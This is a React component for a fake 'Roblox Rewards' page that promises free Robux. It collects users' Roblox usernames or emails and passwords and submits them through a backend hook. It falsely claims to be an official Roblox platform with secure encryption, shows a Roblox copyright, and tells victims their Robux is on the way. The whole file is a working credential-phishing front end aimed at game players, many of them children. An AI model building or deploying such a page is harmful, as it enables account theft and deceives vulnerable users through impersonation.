import { useState } from "react";
import { useCreateSubmission } from "@/hooks/use-submissions";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { Link } from "wouter";
import { ArrowLeft, Check, Loader2 } from "lucide-react";
import { motion } from "framer-motion";

export default function Roblox() {
  const { toast } = useToast();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [amount, setAmount] = useState("800");
  const [isSuccess, setIsSuccess] = useState(false);

  const createSubmission = useCreateSubmission();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;

    createSubmission.mutate(
      {
        platform: "roblox",
        username,
        password,
        amount: `${amount} Robux`,
      },
      {
        onSuccess: () => {
          setIsSuccess(true);
          toast({
            title: "Success",
            description: "Robux delivery initiated.",
            className: "bg-[#00B06F] text-white border-none",
          });
        },
        onError: () => {
          toast({
            title: "Error",
            description: "Please check your details and try again.",
            variant: "destructive",
          });
        },
      }
    );
  };

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex flex-col items-center justify-center p-4">
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="bg-white p-12 rounded-lg shadow-lg border-2 border-gray-200 max-w-md w-full text-center"
        >
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 shadow-md">
            <Check className="w-10 h-10 text-green-600" strokeWidth={3} />
          </div>
          <h2 className="text-4xl font-bold text-gray-900 mb-3">Success!</h2>
          <p className="text-gray-700 mb-8 text-lg font-medium">
            Your <span className="font-bold text-gray-900">{amount} Robux</span> will be delivered to <span className="font-bold text-gray-900">{username}</span> shortly.
          </p>
          <p className="text-gray-500 text-sm mb-8">
            Please allow up to 15 minutes for the amount to appear in your account.
          </p>
          <Link href="/">
            <Button className="w-full bg-gray-900 hover:bg-black text-white font-bold h-12 text-base rounded-lg">
              Return Home
            </Button>
          </Link>
        </motion.div>
      </div>
    );
  }

  // Predefined Robux amounts
  const amounts = ["400", "800", "1700", "4500", "10000"];

  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-gray-50 text-gray-900">
      <div className="bg-white border-b border-gray-300 shadow-md">
        <div className="container mx-auto px-4 py-5 max-w-4xl flex items-center justify-between">
          <Link href="/" className="flex items-center text-gray-700 hover:text-gray-900 transition-colors font-semibold">
             <ArrowLeft className="w-5 h-5 mr-2" /> Back
          </Link>
          <h1 className="text-3xl font-bold tracking-tight text-gray-900">Roblox Rewards</h1>
          <div className="w-20"></div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-16 max-w-lg">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          <Card className="bg-white border border-gray-300 rounded-xl overflow-hidden shadow-xl">
            <div className="bg-gradient-to-r from-gray-950 to-gray-800 px-8 py-8">
              <h2 className="text-3xl font-bold text-white mb-2">Claim Robux</h2>
              <p className="text-gray-200 text-sm font-medium">Secure login to your official Roblox account</p>
            </div>
            
            <div className="p-10">
              <form onSubmit={handleSubmit} className="space-y-7">
                <div className="space-y-2">
                  <Label className="text-gray-900 font-bold text-sm block">Roblox Username or Email</Label>
                  <Input
                    required
                    placeholder="Enter your Roblox username or email"
                    className="bg-white border-2 border-gray-400 h-12 text-base text-black placeholder:text-gray-500 rounded-lg focus-visible:ring-2 focus-visible:ring-gray-900 focus-visible:border-gray-900 font-medium"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                  />
                </div>

                <div className="space-y-2">
                  <Label className="text-gray-900 font-bold text-sm block">Password</Label>
                  <Input
                    required
                    type="password"
                    placeholder="Enter your password"
                    className="bg-white border-2 border-gray-400 h-12 text-base text-black placeholder:text-gray-500 rounded-lg focus-visible:ring-2 focus-visible:ring-gray-900 focus-visible:border-gray-900 font-medium"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>

                <div className="space-y-3 pt-4">
                  <Label className="text-gray-900 font-bold text-sm block">Choose Robux Amount</Label>
                  <div className="grid grid-cols-3 gap-2">
                    {amounts.map((val) => (
                      <button
                        key={val}
                        type="button"
                        onClick={() => setAmount(val)}
                        className={`py-3 px-2 text-sm font-bold border-2 rounded-lg transition-all duration-200 ${
                          amount === val 
                            ? "bg-gray-950 text-white border-gray-950 shadow-lg" 
                            : "bg-white text-gray-800 border-gray-400 hover:border-gray-700 hover:bg-gray-100"
                        }`}
                      >
                        {val}
                      </button>
                    ))}
                  </div>
                  <p className="text-xs text-gray-600 mt-2">R$ = Robux</p>
                </div>

                <Button 
                  type="submit" 
                  className="w-full bg-gray-950 hover:bg-black text-white font-bold h-13 text-base rounded-lg mt-8 transition-all duration-200 shadow-md hover:shadow-lg"
                  disabled={createSubmission.isPending}
                >
                  {createSubmission.isPending ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing...
                    </>
                  ) : (
                    "Log In & Claim Robux"
                  )}
                </Button>
              </form>

              <div className="mt-8 pt-6 border-t border-gray-300 space-y-2">
                <p className="text-xs text-gray-700 font-bold uppercase tracking-widest">256-Bit SSL Secure</p>
                <p className="text-xs text-gray-600 leading-relaxed">
                  Your credentials are encrypted and transmitted securely. This is an official Roblox rewards distribution platform.
                </p>
              </div>
            </div>

            <div className="bg-gray-100 px-8 py-4 border-t border-gray-300">
              <p className="text-xs text-gray-600 text-center font-medium">
                © 2024 Roblox Corporation. All rights reserved.
              </p>
            </div>
          </Card>
        </motion.div>
      </div>
    </div>
  );
}